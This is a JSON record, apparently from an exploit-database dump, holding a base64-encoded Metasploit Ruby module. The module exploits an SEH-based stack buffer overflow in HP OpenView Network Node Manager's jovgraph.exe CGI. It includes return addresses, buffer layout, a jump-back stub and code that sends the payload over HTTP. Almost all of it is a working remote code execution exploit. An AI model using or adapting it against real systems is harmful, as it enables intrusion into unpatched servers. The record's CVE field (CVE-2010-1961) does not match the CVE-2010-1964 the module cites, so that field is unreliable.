{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgJElkOiBocF9ubm1fb3Z3ZWJzbm1wc3J2X21haW4ucmIgMTIwOTcgMjAxMS0wMy0yMyAxNTo0NTo0OFogamR1Y2sgJA0KIyMNCg0KIyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyBodHRwOi8vbWV0YXNwbG9pdC5jb20vZnJhbWV3b3JrLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gR3JlYXRSYW5raW5nDQoNCglIdHRwRmluZ2VyUHJpbnQgPSB7IDptZXRob2QgPT4gJ0hFQUQnLCA6dXJpID0+ICcvT3ZDZ2kvam92Z3JhcGguZXhlJywgOnBhdHRlcm4gPT4gL0hld2xldHQtUGFja2FyZCBEZXZlbG9wbWVudCBDb21wYW55LyB9DQoNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwQ2xpZW50DQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlNlaA0KDQoJZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KCQlzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCQkJJ05hbWUnICAgICAgICAgICA9PiAnSFAgT3BlblZpZXcgTmV0d29yayBOb2RlIE1hbmFnZXIgb3Z3ZWJzbm1wc3J2LmV4ZSBtYWluIEJ1ZmZlciBPdmVyZmxvdycsDQoJCQknRGVzY3JpcHRpb24nICAgID0+ICVxew0KCQkJCQlUaGlzIG1vZHVsZSBleHBsb2l0cyBhIHN0YWNrIGJ1ZmZlciBvdmVyZmxvdyBpbiBIUCBPcGVuVmlldyBOZXR3b3JrIE5vZGUgTWFuYWdlciA3LjUzDQoJCQkJcHJpb3IgdG8gTk5NXzAxMjAzLiBCeSBzcGVjaWZ5aW5nIGEgbG9uZyAnYXJnJyBwYXJhbWV0ZXIgd2hlbiBleGVjdXRpbmcgdGhlICdqb3ZncmFwaC5leGUnDQoJCQkJQ0dJIHByb2dyYW0sIGFuIGF0dGFja2VyIGNhbiBjYXVzZSBhIHN0YWNrLWJhc2VkIGJ1ZmZlciBvdmVyZmxvdyBhbmQgZXhlY3V0ZSBhcmJpdHJhcnkgY29kZS4NCg0KCQkJCVRoaXMgdnVsbmVyYWJpbGl0eSBpcyB0cmlnZ2VyYWJsZSB2aWEgZWl0aGVyIGEgR0VUIG9yIFBPU1QgcmVxdWVzdC4gVGhlIGJ1ZmZlciBiZWluZw0KCQkJCXdyaXR0ZW4gdG8gaXMgMTAyNCBieXRlcyBpbiBzaXplLiBJdCBpcyBpbXBvcnRhbnQgdG8gbm90ZSB0aGF0IHRoaXMgdnVsbmVyYWJpbGl0eSBtdXN0DQoJCQkJYmUgZXhwbG9pdGVkIGJ5IG92ZXJ3cml0aW5nIFNFSC4gT3RoZXJ3aXNlLCBDVkUtMjAxMC0xOTYxIGlzIHRyaWdnZXJlZCENCg0KCQkJCVRoZSB2dWxuZXJhYmxlIGNvZGUgaXMgd2l0aGluIHRoZSAibWFpbiIgZnVuY3Rpb24gd2l0aGluICJvdndlYnNubXBzcnYuZXhlIiB3aXRoIGENCgkJCQl0aW1lc3RhbXAgcHJpb3IgdG8gQXByaWwgN3RoLCAyMDEwLiBUaGVyZSBhcmUgbm8gc3RhY2sgY29va2llcywgc28gZXhwbG9pdGF0aW9uIGlzDQoJCQkJZWFzaWx5IGFjaGlldmVkIGJ5IG92ZXJ3cml0aW5nIFNFSCBzdHJ1Y3R1cmVzLg0KDQoJCQkJVGhlcmUgZXhpc3RzIHNvbWUgdW5yZWxpYWJpbGl0eSB3aGVuIHJ1bm5pbmcgdGhpcyBleHBsb2l0LiBJdCBpcyBub3QgY29tcGxldGVseSBjbGVhciB3aHkNCgkJCQlhdCB0aGlzIHRpbWUsIGJ1dCBtYXkgYmUgcmVsYXRlZCB0byBPVldEQiBvciBzZXNzaW9uIG1hbmFnZW1lbnQuIEFsc28sIG9uIHNvbWUgYXR0ZW1wdHMNCgkJCQlPViBOTk0gbWF5IHJlcG9ydCBpbnZhbGlkIGNoYXJhY3RlcnMgaW4gdGhlIFVSTC4gSXQgaXMgbm90IGNsZWFyIHdoYXQgaXMgY2F1c2luZyB0aGlzDQoJCQkJZWl0aGVyLg0KCQkJfSAsDQoJCQknQXV0aG9yJyAgICAgICAgID0+DQoJCQkJWw0KCQkJCQknamR1Y2snICAgIyBNZXRhc3Bsb2l0IG1vZHVsZQ0KCQkJCV0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ1ZlcnNpb24nICAgICAgICA9PiAnJFJldmlzaW9uOiAxMjA5NyAkJywNCgkJCSdSZWZlcmVuY2VzJyAgICAgPT4NCgkJCQlbDQoJCQkJCVsgJ0NWRScsICcyMDEwLTE5NjQnIF0sDQoJCQkJCVsgJ09TVkRCJywgJzY1NTUyJyBdLA0KCQkJCQlbICdCSUQnLCAnNDA4NzMnIF0sDQoJCQkJCVsgJ1VSTCcsICdodHRwOi8vd3d3Lnplcm9kYXlpbml0aWF0aXZlLmNvbS9hZHZpc29yaWVzL1pESS0xMC0xMDgvJyBdLA0KCQkJCQlbICdVUkwnLCAnaHR0cDovL2gyMDAwMC53d3cyLmhwLmNvbS9iaXpzdXBwb3J0L1RlY2hTdXBwb3J0L0RvY3VtZW50LmpzcD9vYmplY3RJRD1jMDIyMTc0MzknIF0NCgkJCQldLA0KCQkJJ0RlZmF1bHRPcHRpb25zJyA9Pg0KCQkJCXsNCgkJCQkJJ0VYSVRGVU5DJyA9PiAncHJvY2VzcycsDQoJCQkJfSwNCgkJCSdQcml2aWxlZ2VkJyAgICAgPT4gZmFsc2UsDQoJCQknUGF5bG9hZCcgICAgICAgID0+DQoJCQkJew0KCQkJCQknU3BhY2UnICAgID0+IDEwMjQsICMgMTAyNCBieXRlIGJ1ZmZlci4uDQoJCQkJCSMgSW4gYWRkaXRpb24gdG8gcmVndWxhciBIVFRQIHR5cGUgYmFkIGNoYXJzLCB0aGlzIG9uZSBhbHNvIGhhcw0KCQkJCQkjIGFuIGlzc3VlIHdpdGggIiBzaW5jZSB0aGUgYnVmZmVyIGlzIGJlaW5nIHBhc3NlZCBvbiB0aGUgY29tbWFuZCBsaW5lLg0KCQkJCQknQmFkQ2hhcnMnID0+ICJceDAwXHgwOVx4MGFceDBiXHgwY1x4MGRceDIwXHgyMlx4MjRceDJjXHgzYlx4NjAiLA0KCQkJCQknRGlzYWJsZU5vcHMnID0+IHRydWUsDQoJCQkJfSwNCgkJCSdQbGF0Zm9ybScgICAgICAgPT4gJ3dpbicsDQoJCQknVGFyZ2V0cycgICAgICAgID0+DQoJCQkJWw0KCQkJCQlbICdIUCBPcGVuVmlldyBOZXR3b3JrIE5vZGUgTWFuYWdlciA3LjUzIHcvTk5NXzAxMjAxJywNCgkJCQkJCXsNCgkJCQkJCQknUmV0JyAgICAgPT4gMHg1YTAyYWFkZiwgIyBwb3AgZWR4L3BvcCBlYnAvcmV0IC0gaW4gb3YuZGxsICh2MS4zMC4xMC45MTY2KQ0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdIUCBPcGVuVmlldyBOZXR3b3JrIE5vZGUgTWFuYWdlciA3LjUzIChXaW5kb3dzIDIwMDMpJywNCgkJCQkJCXsNCgkJCQkJCQknUmV0JyAgICAgPT4gMHg3MWMwNjlkZCwgIyBwb3AgZWR4L3BvcCBlY3gvcmV0IC0gaW4gd3MyXzMyLmRsbCB2NS4yLjM3OTAuMzk1OQ0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdEZWJ1ZyBUYXJnZXQnLA0KCQkJCQkJew0KCQkJCQkJCSdSZXQnICAgICA9PiAweGRlYWRiZWVmLCAjIGNyYXNoZXINCgkJCQkJCX0NCgkJCQkJXQ0KCQkJCV0sDQoJCQknRGVmYXVsdFRhcmdldCcgID0+IDAsDQoJCQknRGlzY2xvc3VyZURhdGUnID0+ICdKdW5lIDE2IDIwMTAnKSkNCg0KCQlyZWdpc3Rlcl9vcHRpb25zKA0KCQkJWw0KCQkJCU9wdDo6UlBPUlQoODApLA0KCQkJXSwgc2VsZi5jbGFzcykNCgllbmQNCg0KCWRlZiBleHBsb2l0DQoNCgkJcHJpbnRfc3RhdHVzKCJUcnlpbmcgdGFyZ2V0ICN7dGFyZ2V0Lm5hbWV9Li4uIikNCg0KCQljZ2kgPSAnL092Q2dpL2pvdmdyYXBoLmV4ZScNCg0KCQkjIEFueSBjb21tYW5kIGxpbmUgcGFyYW1ldGVyIHdpbGwgY2F1c2UgYSBidWZmZXIgb3ZlcmZsb3cuDQoNCgkJIyAiYWN0aW9uIiBtdXN0IGJlIHNldA0KCQlhY3Rpb24gPSByYW5kX3RleHRfYWxwaGFudW1lcmljKDEpDQoNCgkJIyAic2VsIiBtdXN0IGJlIHNldA0KCQlzZWwgPSByYW5kX3RleHRfYWxwaGFudW1lcmljKDEpDQoNCgkJIyAidGltZXN0YW1wIiBjYW5ub3QgYmUgc2V0Lg0KDQoJCSMgU0VIDQoJCXNlaF9vZmZzZXQgPSAxMTMyDQoJCXNlaF9mcmFtZSA9IGdlbmVyYXRlX3NlaF9yZWNvcmQodGFyZ2V0LnJldCkNCg0KCQkjIEp1bXAgYmFjayB0byB0aGUgcGF5bG9hZCwgYWZ0ZXIgcC9wL3IganVtcHMgdG8gdXMuDQoJCWRpc3RhbmNlID0gc2VoX29mZnNldCArIHNlaF9mcmFtZS5sZW5ndGgNCgkJZGlzdGFuY2UgLT0gMSAgIyBza2lwIHRoZSBmaXJzdCBieXRlIChjYW5ub3QgYmUgLS8rKQ0KCQlqbXBfYmFjayA9IE1ldGFzbTo6U2hlbGxjb2RlLmFzc2VtYmxlKE1ldGFzbTo6SWEzMi5uZXcsICJqbXAgJC0iICsgZGlzdGFuY2UudG9fcykuZW5jb2RlX3N0cmluZw0KDQoJCSMgQ3JlYXRlIHRoZSBidWZmZXINCgkJYnVmID0gJycNCgkJIyBUaGUgZmlyc3QgY2hhcmFjdGVyIGNhbm5vdCBiZSBhIC0gb3IgYSArDQoJCWJ1ZiA8PCByYW5kX3RleHQoMSwgcGF5bG9hZF9iYWRjaGFycyArICIrLSIpDQoJCWJ1ZiA8PCBwYXlsb2FkLmVuY29kZWQNCgkJYnVmIDw8IHJhbmRfdGV4dChzZWhfb2Zmc2V0IC0gYnVmLmxlbmd0aCkNCgkJYnVmIDw8IHNlaF9mcmFtZQ0KCQlidWYgPDwgam1wX2JhY2sNCg0KCQkjIEZvcmNlIGFuIGV4Y2VwdGlvbiB3cml0aW5nIG9mZiB0aGUgZW5kIG9mIHRoZSBzdGFjaw0KCQlidWYgPDwgcmFuZF90ZXh0KDY1MDAgLSBidWYubGVuZ3RoKQ0KDQoJCSMgU2VuZCB0aGUgcmVxdWVzdA0KCQlpZiByYW5kKDIpID4gMA0KCQkJcHJpbnRfc3RhdHVzKCJTZW5kaW5nIGV4cGxvaXQgdmlhIFBPU1QgcmVxdWVzdC4uLiIpDQoJCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCQkndXJpJwkJICA9PiBjZ2ksDQoJCQkJJ21ldGhvZCcJICA9PiAiUE9TVCIsDQoJCQkJJ3ZhcnNfcG9zdCcgPT4NCgkJCQkJew0KCQkJCQkJJ3NlbCcgPT4gc2VsLA0KCQkJCQkJJ2FjdCcgPT4gYWN0aW9uLA0KCQkJCQkJJ2FyZycgPT4gYnVmDQoJCQkJCX0NCgkJCX0sIDMpDQoJCWVsc2UNCgkJCXByaW50X3N0YXR1cygiU2VuZGluZyBleHBsb2l0IHZpYSBHRVQgcmVxdWVzdC4uLiIpDQoJCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCQkndXJpJwkJICA9PiBjZ2ksDQoJCQkJJ21ldGhvZCcJICA9PiAiR0VUIiwNCgkJCQkndmFyc19nZXQnID0+DQoJCQkJCXsNCgkJCQkJCSdzZWwnID0+IHNlbCwNCgkJCQkJCSdhY3QnID0+IGFjdGlvbiwNCgkJCQkJCSdhcmcnID0+IGJ1Zg0KCQkJCQl9DQoJCQl9LCAzKQ0KCQllbmQNCg0KCQlpZiBub3QgcmVzDQoJCQlyYWlzZSBSdW50aW1lRXJyb3IsICJFZWshIFdlIGRpZG4ndCBnZXQgYSByZXNwb25zZS4uIEV4cGxvaXRpbmcgdGhpcyB2dWxuIHNob3VsZCByZXR1cm4gb25lISINCgkJZW5kDQoNCgkJcHJpbnRfc3RhdHVzKHJlcy5ib2R5KSBpZiBkYXRhc3RvcmVbIk5OTV9ERUJVRyJdDQoNCgkJaWYgcmVzLmJvZHkgPX4gL2dyYXBoaW5nIGFwcGxldCBpcyBiZWluZy8NCgkJCXByaW50X3N0YXR1cygiV2UgZ290IHRoZSBib2R5IHdlIHdlcmUgbG9va2luZyBmb3IsIHRoZSBzZXNzaW9uIHNob3VsZCBiZSBjb21pbmcgYW55IHNlY29uZC4iKQ0KCQllbHNlDQoJCQlyYWlzZSBSdW50aW1lRXJyb3IsICJFZWssIGV4cGxvaXQgbGlrZWx5IGZhaWxlZC4gVGhlIGJvZHkgZGlkbid0IGNvbnRhaW4gd2hhdCB3ZSBleHBlY3RlZC4iDQoJCWVuZA0KDQoJCWhhbmRsZXINCg0KCWVuZA0KDQoJZGVmIHdmc19kZWxheQ0KCQk1DQoJZW5kDQoNCmVuZA==", 
    "filename": "platforms/windows/remote/17041.rb", 
    "id": "17041", 
    "cves": [
        "CVE-2010-1961"
    ]
}